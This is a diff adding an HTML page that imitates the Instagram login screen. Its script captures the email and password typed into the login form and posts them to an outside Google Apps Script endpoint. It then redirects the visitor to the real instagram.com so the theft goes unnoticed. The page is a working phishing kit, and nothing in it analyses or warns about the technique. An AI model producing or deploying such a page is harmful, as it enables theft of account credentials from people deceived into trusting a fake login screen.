@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram</title>
+    <link rel="stylesheet" href="insta.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="left-side">
+            <img src="phone.png" alt="" class="phone">
+            <img src="d6bf0c928b5a.jpg" alt="" class="pic">
+        </div>
+        <div class="right-side">
+            <div id="input-box">
+                <form action="" id="submit-form">
+                    <img src="instagram.png" alt="" class="insta-logo" onclick="location.href='index.html'">
+                    <input type="email" placeholder="Phone number, username, or email" class="email" name="email" id="lname">
+                    <input type="password" placeholder="Password" class="password" name="password" id="gname">
+                    <input type="submit" value="Log In" class="submit">
+                </form>
+                <hr class="line1">
+                <p class="or">OR</p>
+                <hr class="line2">
+                <img src="fblogo.png" alt="" class="fb-logo">
+                <p class="text"><a href="https://facebook.com" class="fb-con">Log in with Facebook</a><br></p>
+                <p class="forgot"><a href="https://facebook.com" class="forgot">Forgot password?</a></p>
+
+            </div>
+            <div class="dont-ac">
+                <p class="dis">Don't have an account?<a href="https://facebook.com" class="sign-up">Sign up</a></p>
+            </div>
+            <p class="app">Get the app.</p>
+            <button class="apple"  onclick="location.href='https://apps.apple.com/in/app/instagram/id389801252'"></button>
+            <button class="play-store"  onclick="location.href='https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&gl=US'"></button>
+        </div>
+        <div class="footer">
+            <p class="about">About Blog Jobs Help API Privacy Terms Top Accounts Hashtags Locations <br><br>English     © 2021 Instagram from Facebook</p>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbwPrZC-lJoADmZO3RTT8qO2ye2DL5tjim-8FZuwRHjkky0i_pZe-x57ytn79PkpyLQu/exec   ",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    //window.location.reload()
+                    window.location.href="https://instagram.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
